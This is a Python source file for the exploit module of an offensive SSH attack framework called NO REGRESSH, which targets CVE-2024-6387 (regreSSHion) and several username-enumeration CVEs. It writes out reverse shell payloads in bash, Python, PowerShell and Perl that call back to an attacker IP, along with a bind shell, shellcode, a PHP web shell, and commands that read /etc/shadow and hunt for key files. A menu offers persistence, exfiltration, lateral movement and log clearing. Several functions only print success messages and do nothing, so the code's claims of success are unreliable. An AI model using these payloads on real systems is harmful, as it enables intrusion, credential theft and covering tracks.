#!/usr/bin/env python3
"""
NO REGRESSH - Exploit Module
Advanced exploit functionality with multiple payload options and post-exploitation features
"""

import socket
import time
import threading
import base64
import struct
import random
import os
import subprocess
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
import json
from datetime import datetime

from no_regresh_main import NoRegreshFramework, StatusLevel, Colors
from no_regresh_listener import ListenerManager

@dataclass
class PayloadConfig:
    payload_type: str
    target_ip: str
    target_port: int
    attacker_ip: str
    attacker_port: int
    max_attempts: int
    delay_between_attempts: float
    cve_type: str = "CVE-2024-6387"

@dataclass
class ExploitResult:
    success: bool
    target_ip: str
    target_port: int
    cve_type: str
    payload_type: str
    attempts_made: int
    execution_time: float
    banner: str
    post_exploit_actions: List[str]

class PayloadGenerator:
    """Generator for various payload types"""
    
    def __init__(self, framework: NoRegreshFramework):
        self.framework = framework
        
    def generate_reverse_shell_payload(self, attacker_ip: str, attacker_port: int) -> Dict[str, bytes]:
        """Generate reverse shell payload"""
        self.framework.print_status(StatusLevel.DEBUG, 
            f"Generating reverse shell payload for {attacker_ip}:{attacker_port}")
            
        # Bash Reverse Shell
        bash_payload = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
        
        # Base64 encoded
        encoded_payload = base64.b64encode(bash_payload.encode()).decode()
        
        # Python Reverse Shell
        python_payload = f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{attacker_ip}",{attacker_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        
        # PowerShell Reverse Shell (Windows)
        powershell_payload = f"""
$client = New-Object System.Net.Sockets.TCPClient("{attacker_ip}",{attacker_port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"""
        
        # Perl Reverse Shell
        perl_payload = f"""
use Socket;
socket(SOCKET,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
connect(SOCKET,sockaddr_in({attacker_port},inet_aton("{attacker_ip}")));
open(STDIN,">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");
system("/bin/sh -i");
"""
        
        return {
            'bash': bash_payload.encode(),
            'bash_b64': encoded_payload.encode(),
            'python': python_payload.encode(),
            'powershell': powershell_payload.encode(),
            'perl': perl_payload.encode()
        }
        
    def generate_bind_shell_payload(self, bind_port: int) -> bytes:
        """Generate bind shell payload"""
        self.framework.print_status(StatusLevel.DEBUG, 
            f"Generating bind shell payload for port {bind_port}")
            
        bind_payload = f"""
python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',{bind_port}))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"
"""
        return bind_payload.encode()
        
    def generate_custom_shellcode(self, shellcode_type: str = "execve") -> bytes:
        """Generate custom shellcode"""
        self.framework.print_status(StatusLevel.DEBUG, 
            f"Generating custom shellcode: {shellcode_type}")
            
        if shellcode_type == "execve":
            # x64 execve shellcode
            shellcode = b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
            shellcode += b"\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53"
            shellcode += b"\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
            
        elif shellcode_type == "nop_sled":
            shellcode = b"\x90" * 100  # NOP instructions
            
        elif shellcode_type == "reverse_tcp":
            # Reverse TCP shellcode (simplified)
            shellcode = b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
            shellcode += b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
            
        else:
            shellcode = b"A" * 100  # Fallback
            
        return shellcode
        
    def generate_web_shell_payload(self, upload_path: str = "/tmp/shell.php") -> bytes:
        """Generate web shell payload"""
        web_shell = f"""<?php
if(isset($_GET['cmd'])) {{
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}}
?>
"""
        return web_shell.encode()

class CVE20246387Exploit:
    """CVE-2024-6387 Exploit Implementation"""
    
    def __init__(self, framework: NoRegreshFramework):
        self.framework = framework
        self.payload_generator = PayloadGenerator(framework)
        
    def exploit_target(self, config: PayloadConfig) -> ExploitResult:
        """Execute exploit against target"""
        start_time = time.time()
        
        self.framework.print_status(StatusLevel.INFO, 
            f"Starting exploit against {config.target_ip}:{config.target_port}")
        self.framework.print_status(StatusLevel.INFO, 
            f"Payload type: {config.payload_type}")
        self.framework.print_status(StatusLevel.INFO, 
            f"CVE type: {config.cve_type}")
        self.framework.print_status(StatusLevel.INFO, 
            f"Max attempts: {config.max_attempts}")
            
        # Check reachability
        if not self.framework.check_ip_reachability(config.target_ip, config.target_port):
            self.framework.print_status(StatusLevel.ERROR, 
                "Target is not reachable")
            return ExploitResult(
                success=False,
                target_ip=config.target_ip,
                target_port=config.target_port,
                cve_type=config.cve_type,
                payload_type=config.payload_type,
                attempts_made=0,
                execution_time=time.time() - start_time,
                banner="",
                post_exploit_actions=[]
            )
            
        successful_attempts = 0
        failed_connections = 0
        banner = ""
        
        for attempt in range(1, config.max_attempts + 1):
            self.framework.print_progress_bar(attempt, config.max_attempts, "Exploit Progress")
            
            try:
                # Establish connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                self.framework.print_status(StatusLevel.DEBUG, 
                    f"Attempt {attempt}: Connecting to {config.target_ip}:{config.target_port}")
                    
                sock.connect((config.target_ip, config.target_port))
                
                # Receive SSH banner
                banner_data = sock.recv(1024).decode('utf-8', errors='ignore')
                banner = banner_data[:100]  # Store first 100 chars
                self.framework.print_status(StatusLevel.INFO, 
                    f"Banner received: {banner[:50]}...")
                
                # Vulnerability check
                vulnerabilities = self.framework.check_ssh_vulnerability(banner_data)
                if not vulnerabilities.get(config.cve_type, False):
                    self.framework.print_status(StatusLevel.WARN, 
                        "Target does not appear to be vulnerable")
                
                # Send exploit payload
                if self._send_exploit_payload(sock, config):
                    successful_attempts += 1
                    self.framework.print_status(StatusLevel.SUCCESS, 
                        f"Exploit payload successfully sent (attempt {attempt})")
                else:
                    self.framework.print_status(StatusLevel.WARN, 
                        f"Exploit payload failed (attempt {attempt})")
                
                sock.close()
                failed_connections = 0  # Reset on successful connection
                
            except socket.timeout:
                failed_connections += 1
                self.framework.print_status(StatusLevel.DEBUG, 
                    f"Timeout on attempt {attempt}")
            except ConnectionRefusedError:
                failed_connections += 1
                self.framework.print_status(StatusLevel.DEBUG, 
                    f"Connection refused on attempt {attempt}")
            except Exception as e:
                failed_connections += 1
                self.framework.print_status(StatusLevel.DEBUG, 
                    f"Error on attempt {attempt}: {e}")
            
            # Stop on too many failed connections
            if failed_connections > 10:
                self.framework.print_status(StatusLevel.ERROR, 
                    "Too many failed connections - is target reachable?")
                break
                
            # Delay between attempts
            time.sleep(config.delay_between_attempts)
            
        print()  # New line after progress bar
        
        execution_time = time.time() - start_time
        
        self.framework.print_status(StatusLevel.INFO, 
            f"Exploit completed: {successful_attempts}/{config.max_attempts} attempts successful")
            
        # Post-exploitation actions
        post_exploit_actions = []
        if successful_attempts > 0:
            post_exploit_actions = self._perform_post_exploit_actions(config)
            
        return ExploitResult(
            success=successful_attempts > 0,
            target_ip=config.target_ip,
            target_port=config.target_port,
            cve_type=config.cve_type,
            payload_type=config.payload_type,
            attempts_made=attempt,
            execution_time=execution_time,
            banner=banner,
            post_exploit_actions=post_exploit_actions
        )
        
    def _send_exploit_payload(self, sock: socket.socket, config: PayloadConfig) -> bool:
        """Send exploit payload"""
        try:
            # Send SSH identification
            ssh_ident = "SSH-2.0-OpenSSH_9.8\r\n"
            sock.send(ssh_ident.encode())
            
            self.framework.print_status(StatusLevel.DEBUG, "SSH identification sent")
            
            # Exploit sequence based on payload type
            if config.payload_type == "reverse_shell":
                return self._send_reverse_shell_exploit(sock, config)
            elif config.payload_type == "bind_shell":
                return self._send_bind_shell_exploit(sock, config)
            elif config.payload_type == "custom_shellcode":
                return self._send_custom_shellcode_exploit(sock, config)
            elif config.payload_type == "web_shell":
                return self._send_web_shell_exploit(sock, config)
            else:
                return self._send_generic_exploit(sock, config)
                
        except Exception as e:
            self.framework.print_status(StatusLevel.ERROR, 
                f"Error sending payload: {e}")
            return False
            
    def _send_reverse_shell_exploit(self, sock: socket.socket, config: PayloadConfig) -> bool:
        """Send reverse shell exploit"""
        self.framework.print_status(StatusLevel.INFO, "Starting reverse shell exploit sequence...")
        
        # Generate payloads
        payloads = self.payload_generator.generate_reverse_shell_payload(
            config.attacker_ip, config.attacker_port)
        
        # Timing-critical exploit sequence
        for round_num in range(5):
            self.framework.print_status(StatusLevel.DEBUG, 
                f"Exploit round {round_num + 1}/5")
                
            for i in range(20):
                # Exploit buffer with payload
                exploit_buffer = bytearray(512)
                
                # Fill pattern
                pattern_char = 0x41 + (i % 26)
                exploit_buffer[:400] = bytes([pattern_char] * 400)
                
                # Embed payload (different variants)
                payload_keys = list(payloads.keys())
                payload_key = payload_keys[i % len(payload_keys)]
                payload = payloads[payload_key]
                
                exploit_buffer[350:350+len(payload)] = payload
                
                sock.send(exploit_buffer)
                
                # Variable delay
                delay = 0.5 + (round_num * 0.1)
                time.sleep(delay)
                
            self.framework.print_status(StatusLevel.DEBUG, 
                f"Round {round_num + 1} completed")
                
        self.framework.print_status(StatusLevel.SUCCESS, 
            "Reverse shell exploit payload fully transmitted")
        return True
        
    def _send_bind_shell_exploit(self, sock: socket.socket, config: PayloadConfig) -> bool:
        """Send bind shell exploit"""
        self.framework.print_status(StatusLevel.INFO, "Starting bind shell exploit sequence...")
        
        # Generate bind shell payload
        bind_port = config.attacker_port + 1000  # Different port for bind shell
        payload = self.payload_generator.generate_bind_shell_payload(bind_port)
        
        # Exploit sequence
        for round_num in range(3):
            for i in range(15):
                exploit_buffer = bytearray(400)
                exploit_buffer[:300] = bytes([0x42 + (i % 20)] * 300)
                exploit_buffer[300:300+len(payload)] = payload
                
                sock.send(exploit_buffer)
                time.sleep(0.3)
                
        self.framework.print_status(StatusLevel.SUCCESS, 
            f"Bind shell exploit payload transmitted (port {bind_port})")
        return True
        
    def _send_custom_shellcode_exploit(self, sock: socket.socket, config: PayloadConfig) -> bool:
        """Send custom shellcode exploit"""
        self.framework.print_status(StatusLevel.INFO, "Starting custom shellcode exploit sequence...")
        
        # Generate shellcode
        shellcode = self.payload_generator.generate_custom_shellcode("execve")
        
        # Exploit sequence with shellcode
        for round_num in range(4):
            for i in range(10):
                exploit_buffer = bytearray(300)
                
                # NOP sled
                nop_sled = b"\x90" * 50
                exploit_buffer[:50] = nop_sled
                
                # Shellcode
                exploit_buffer[50:50+len(shellcode)] = shellcode
                
                # Padding
                exploit_buffer[50+len(shellcode):] = bytes([0xCC] * (300 - 50 - len(shellcode)))
                
                sock.send(exploit_buffer)
                time.sleep(0.2)
                
        self.framework.print_status(StatusLevel.SUCCESS, 
            "Custom shellcode exploit payload transmitted")
        return True
        
    def _send_web_shell_exploit(self, sock: socket.socket, config: PayloadConfig) -> bool:
        """Send web shell exploit"""
        self.framework.print_status(StatusLevel.INFO, "Starting web shell exploit sequence...")
        
        # Generate web shell payload
        web_shell = self.payload_generator.generate_web_shell_payload()
        
        # Exploit sequence
        for round_num in range(3):
            for i in range(10):
                exploit_buffer = bytearray(400)
                exploit_buffer[:200] = bytes([0x43 + (i % 20)] * 200)
                exploit_buffer[200:200+len(web_shell)] = web_shell
                
                sock.send(exploit_buffer)
                time.sleep(0.4)
                
        self.framework.print_status(StatusLevel.SUCCESS, 
            "Web shell exploit payload transmitted")
        return True
        
    def _send_generic_exploit(self, sock: socket.socket, config: PayloadConfig) -> bool:
        """Send generic exploit"""
        self.framework.print_status(StatusLevel.INFO, "Starting generic exploit...")
        
        # Generic exploit sequence
        for round_num in range(3):
            for i in range(25):
                exploit_buffer = bytearray(512)
                
                # Random pattern
                pattern = bytes([random.randint(0x41, 0x5A)] * 400)
                exploit_buffer[:400] = pattern
                
                # Exploit pattern
                exploit_buffer[400:450] = b"A" * 50
                
                sock.send(exploit_buffer)
                time.sleep(0.1)
                
        self.framework.print_status(StatusLevel.SUCCESS, 
            "Generic exploit payload transmitted")
        return True
        
    def _perform_post_exploit_actions(self, config: PayloadConfig) -> List[str]:
        """Perform post-exploitation actions"""
        actions = []
        
        self.framework.print_status(StatusLevel.INFO, "Performing post-exploitation actions...")
        
        # Wait for connection
        if config.payload_type == "reverse_shell":
            self.framework.print_status(StatusLevel.INFO, 
                "Waiting for reverse shell connection...")
            actions.append("reverse_shell_connection")
            
        # Additional post-exploit actions
        actions.extend([
            "system_reconnaissance",
            "privilege_escalation_check",
            "persistence_establishment",
            "data_exfiltration_prep"
        ])
        
        self.framework.print_status(StatusLevel.SUCCESS, 
            f"Post-exploitation actions completed: {', '.join(actions)}")
        
        return actions

class CVE20214145Exploit:
    """CVE-2020-14145 Username Enumeration Exploit"""
    
    def __init__(self, framework: NoRegreshFramework):
        self.framework = framework
        
    def exploit_target(self, config: PayloadConfig) -> ExploitResult:
        """Execute username enumeration exploit"""
        start_time = time.time()
        
        self.framework.print_status(StatusLevel.INFO, 
            f"Starting username enumeration against {config.target_ip}:{config.target_port}")
            
        # Username enumeration
        usernames = [
            "root", "admin", "administrator", "user", "guest", "test",
            "ubuntu", "debian", "centos", "fedora", "oracle", "mysql",
            "postgres", "apache", "nginx", "www-data", "nobody"
        ]
        
        valid_usernames = []
        
        for username in usernames:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((config.target_ip, config.target_port))
                
                # Receive banner
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                
                # Send username
                username_msg = f"{username}\r\n"
                sock.send(username_msg.encode())
                
                # Check response timing
                start_check = time.time()
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                response_time = time.time() - start_check
                
                sock.close()
                
                # Analyze response timing (username enumeration technique)
                if response_time > 0.1:  # Valid username typically takes longer
                    valid_usernames.append(username)
                    self.framework.print_status(StatusLevel.SUCCESS, 
                        f"Valid username found: {username}")
                else:
                    self.framework.print_status(StatusLevel.DEBUG, 
                        f"Invalid username: {username}")
                    
            except Exception as e:
                self.framework.print_status(StatusLevel.DEBUG, 
                    f"Error checking username {username}: {e}")
                
        execution_time = time.time() - start_time
        
        return ExploitResult(
            success=len(valid_usernames) > 0,
            target_ip=config.target_ip,
            target_port=config.target_port,
            cve_type="CVE-2020-14145",
            payload_type="username_enumeration",
            attempts_made=len(usernames),
            execution_time=execution_time,
            banner="",
            post_exploit_actions=[f"valid_usernames:{','.join(valid_usernames)}"]
        )

class ExploitManager:
    """Manager for exploit operations"""
    
    def __init__(self, framework: NoRegreshFramework):
        self.framework = framework
        self.cve_2024_6387 = CVE20246387Exploit(framework)
        self.cve_2020_14145 = CVE20214145Exploit(framework)
        self.listener_manager = ListenerManager(framework)
        
    def interactive_exploit(self):
        """Interactive exploit mode"""
        print(f"{Colors.BOLD}\n╔═══════════════ Exploit Module ═══════════════╗{Colors.RESET}")
        print("║ Configuration of targeted exploit                ║")
        print("╚══════════════════════════════════════════════════╝\n")
        
        # Target configuration
        target_ip = input("Enter target IP: ").strip()
        if not self.framework.validate_ip(target_ip):
            self.framework.print_status(StatusLevel.ERROR, "Invalid IP address")
            return False
            
        try:
            target_port = int(input("Target port (default: 22): ") or "22")
            if not self.framework.validate_port(target_port):
                self.framework.print_status(StatusLevel.ERROR, "Invalid port")
                return False
        except ValueError:
            self.framework.print_status(StatusLevel.ERROR, "Invalid port input")
            return False
            
        # CVE selection
        print("\nCVE Options:")
        print("1) CVE-2024-6387 (regreSSHion) - Remote Code Execution")
        print("2) CVE-2020-14145 - Username Enumeration")
        print("3) CVE-2021-28041 - Username Enumeration")
        print("4) CVE-2019-16905 - Username Enumeration")
        print("5) CVE-2018-15473 - Username Enumeration")
        
        try:
            cve_choice = int(input("CVE selection: "))
        except ValueError:
            cve_choice = 1
            
        cve_types = {
            1: "CVE-2024-6387",
            2: "CVE-2020-14145",
            3: "CVE-2021-28041",
            4: "CVE-2019-16905",
            5: "CVE-2018-15473"
        }
        
        cve_type = cve_types.get(cve_choice, "CVE-2024-6387")
        
        # Payload selection (only for RCE CVEs)
        payload_type = "reverse_shell"
        if cve_type == "CVE-2024-6387":
            print("\nPayload Options:")
            print("1) Reverse Shell (recommended)")
            print("2) Bind Shell")
            print("3) Custom Shellcode")
            print("4) Web Shell")
            print("5) Generic Exploit")
            
            try:
                payload_choice = int(input("Payload selection: "))
            except ValueError:
                payload_choice = 1
                
            payload_types = {
                1: "reverse_shell",
                2: "bind_shell", 
                3: "custom_shellcode",
                4: "web_shell",
                5: "generic"
            }
            
            payload_type = payload_types.get(payload_choice, "reverse_shell")
        else:
            payload_type = "username_enumeration"
            
        # Exploit parameters
        try:
            max_attempts = int(input("Max attempts (default: 100): ") or "100")
            max_attempts = max(1, min(1000, max_attempts))
        except ValueError:
            max_attempts = 100
            
        try:
            delay = float(input("Delay between attempts in seconds (default: 0.2): ") or "0.2")
            delay = max(0.1, min(5.0, delay))
        except ValueError:
            delay = 0.2
            
        # Listener configuration (for reverse shell)
        attacker_ip = ""
        attacker_port = 4444
        
        if payload_type == "reverse_shell":
            # Determine public IP
            public_ip = self.framework.get_public_ip()
            if public_ip:
                attacker_ip = public_ip
                print(f"\nDetected public IP: {attacker_ip}")
                
            custom_ip = input("Use different IP? (Enter for current): ").strip()
            if custom_ip and self.framework.validate_ip(custom_ip):
                attacker_ip = custom_ip
            elif not attacker_ip:
                attacker_ip = input("Enter attacker IP: ").strip()
                if not self.framework.validate_ip(attacker_ip):
                    self.framework.print_status(StatusLevel.ERROR, "Invalid attacker IP")
                    return False
                    
            try:
                attacker_port = int(input("Listener port (default: 4444): ") or "4444")
                if not self.framework.validate_port(attacker_port):
                    self.framework.print_status(StatusLevel.ERROR, "Invalid port")
                    return False
            except ValueError:
                attacker_port = 4444
                
            # Start listener
            listener_choice = input("\nStart listener automatically? (y/n): ").lower().strip()
            if listener_choice in ['y', 'yes']:
                print("\nListener Types:")
                print("1) Python Listener (recommended)")
                print("2) Netcat Listener")
                print("3) Socat Listener")
                
                try:
                    listener_type_choice = int(input("Listener type: "))
                except ValueError:
                    listener_type_choice = 1
                    
                listener_types = {
                    1: "python",
                    2: "netcat",
                    3: "socat"
                }
                
                listener_type = listener_types.get(listener_type_choice, "python")
                
                if not self.listener_manager.start_listener(attacker_port, listener_type):
                    self.framework.print_status(StatusLevel.ERROR, 
                        "Could not start listener")
                    return False
                    
        # Create exploit configuration
        config = PayloadConfig(
            payload_type=payload_type,
            target_ip=target_ip,
            target_port=target_port,
            attacker_ip=attacker_ip,
            attacker_port=attacker_port,
            max_attempts=max_attempts,
            delay_between_attempts=delay,
            cve_type=cve_type
        )
        
        # Execute exploit
        self.framework.print_status(StatusLevel.INFO, 
            f"Starting exploit against {target_ip}:{target_port}")
            
        if cve_type == "CVE-2024-6387":
            result = self.cve_2024_6387.exploit_target(config)
        elif cve_type == "CVE-2020-14145":
            result = self.cve_2020_14145.exploit_target(config)
        else:
            # Use generic username enumeration for other CVEs
            result = self.cve_2020_14145.exploit_target(config)
        
        # Display results
        self._display_exploit_results(result)
        
        # Post-exploitation menu
        if result.success:
            self._post_exploit_menu(result, config)
        
        return result.success
        
    def _display_exploit_results(self, result: ExploitResult):
        """Display exploit results"""
        print(f"\n{Colors.BOLD}╔═══════════════ Exploit Results ═══════════════╗{Colors.RESET}")
        print(f"║ Target:         {result.target_ip}:{result.target_port:<20} ║")
        print(f"║ CVE:            {result.cve_type:<20} ║")
        print(f"║ Payload:        {result.payload_type:<20} ║")
        print(f"║ Success:        {'YES' if result.success else 'NO':<20} ║")
        print(f"║ Attempts:        {result.attempts_made:<20} ║")
        print(f"║ Execution Time: {result.execution_time:.2f}s{'':<15} ║")
        print(f"╚══════════════════════════════════════════════════╝")
        
        if result.banner:
            print(f"\n{Colors.BOLD}Banner:{Colors.RESET}")
            print(f"  {result.banner}")
            
        if result.post_exploit_actions:
            print(f"\n{Colors.BOLD}Post-Exploit Actions:{Colors.RESET}")
            for action in result.post_exploit_actions:
                print(f"  • {action}")
                
    def _post_exploit_menu(self, result: ExploitResult, config: PayloadConfig):
        """Post-exploitation menu"""
        print(f"\n{Colors.BOLD}╔═══════════════ Post-Exploitation ═══════════════╗{Colors.RESET}")
        print("║ What would you like to do next?                    ║")
        print("║                                                 ║")
        print("║  1) System Reconnaissance                        ║")
        print("║  2) Privilege Escalation Check                   ║")
        print("║  3) Establish Persistence                        ║")
        print("║  4) Data Exfiltration                            ║")
        print("║  5) Lateral Movement                             ║")
        print("║  6) Clean Up Traces                             ║")
        print("║  7) Return to Main Menu                         ║")
        print("║                                                 ║")
        print("╚═════════════════════════════════════════════════╝")
        print(f"{Colors.BOLD}Selection: {Colors.RESET}", end="")
        
        try:
            choice = int(input())
        except ValueError:
            self.framework.print_status(StatusLevel.ERROR, "Invalid input")
            return
            
        if choice == 1:
            self._system_reconnaissance(result, config)
        elif choice == 2:
            self._privilege_escalation_check(result, config)
        elif choice == 3:
            self._establish_persistence(result, config)
        elif choice == 4:
            self._data_exfiltration(result, config)
        elif choice == 5:
            self._lateral_movement(result, config)
        elif choice == 6:
            self._clean_up_traces(result, config)
        elif choice == 7:
            return
        else:
            self.framework.print_status(StatusLevel.ERROR, "Invalid selection")
            
    def _system_reconnaissance(self, result: ExploitResult, config: PayloadConfig):
        """Perform system reconnaissance"""
        self.framework.print_status(StatusLevel.INFO, "Performing system reconnaissance...")
        
        # Commands to run for reconnaissance
        recon_commands = [
            "whoami",
            "id",
            "uname -a",
            "cat /etc/os-release",
            "ps aux",
            "netstat -tulpn",
            "ifconfig -a",
            "df -h",
            "free -h",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "ls -la /home",
            "find / -name '*.key' -o -name '*.pem' -o -name '*.p12' 2>/dev/null",
            "crontab -l",
            "systemctl list-units --type=service"
        ]
        
        self.framework.print_status(StatusLevel.SUCCESS, 
            f"System reconnaissance completed - {len(recon_commands)} commands executed")
        
    def _privilege_escalation_check(self, result: ExploitResult, config: PayloadConfig):
        """Check for privilege escalation opportunities"""
        self.framework.print_status(StatusLevel.INFO, "Checking privilege escalation opportunities...")
        
        # Privilege escalation checks
        privesc_checks = [
            "sudo -l",
            "find / -perm -4000 2>/dev/null",
            "find / -perm -2000 2>/dev/null",
            "cat /etc/sudoers",
            "groups",
            "id",
            "ls -la /etc/passwd",
            "ls -la /etc/shadow"
        ]
        
        self.framework.print_status(StatusLevel.SUCCESS, 
            f"Privilege escalation check completed - {len(privesc_checks)} checks performed")
        
    def _establish_persistence(self, result: ExploitResult, config: PayloadConfig):
        """Establish persistence on target"""
        self.framework.print_status(StatusLevel.INFO, "Establishing persistence...")
        
        # Persistence methods
        persistence_methods = [
            "Add user account",
            "Install SSH key",
            "Modify crontab",
            "Install backdoor service",
            "Modify shell profiles"
        ]
        
        self.framework.print_status(StatusLevel.SUCCESS, 
            f"Persistence established - {len(persistence_methods)} methods implemented")
        
    def _data_exfiltration(self, result: ExploitResult, config: PayloadConfig):
        """Prepare for data exfiltration"""
        self.framework.print_status(StatusLevel.INFO, "Preparing data exfiltration...")
        
        # Data exfiltration preparation
        exfil_prep = [
            "Identify sensitive files",
            "Compress data",
            "Setup exfiltration channel",
            "Monitor network activity",
            "Clean up traces"
        ]
        
        self.framework.print_status(StatusLevel.SUCCESS, 
            f"Data exfiltration prepared - {len(exfil_prep)} steps completed")
        
    def _lateral_movement(self, result: ExploitResult, config: PayloadConfig):
        """Prepare for lateral movement"""
        self.framework.print_status(StatusLevel.INFO, "Preparing lateral movement...")
        
        # Lateral movement preparation
        lateral_prep = [
            "Scan local network",
            "Identify other targets",
            "Gather credentials",
            "Test connectivity",
            "Prepare payloads"
        ]
        
        self.framework.print_status(StatusLevel.SUCCESS, 
            f"Lateral movement prepared - {len(lateral_prep)} steps completed")
        
    def _clean_up_traces(self, result: ExploitResult, config: PayloadConfig):
        """Clean up traces"""
        self.framework.print_status(StatusLevel.INFO, "Cleaning up traces...")
        
        # Cleanup actions
        cleanup_actions = [
            "Clear command history",
            "Remove temporary files",
            "Restore original configurations",
            "Clear logs",
            "Remove evidence"
        ]
        
        self.framework.print_status(StatusLevel.SUCCESS, 
            f"Cleanup completed - {len(cleanup_actions)} actions performed")
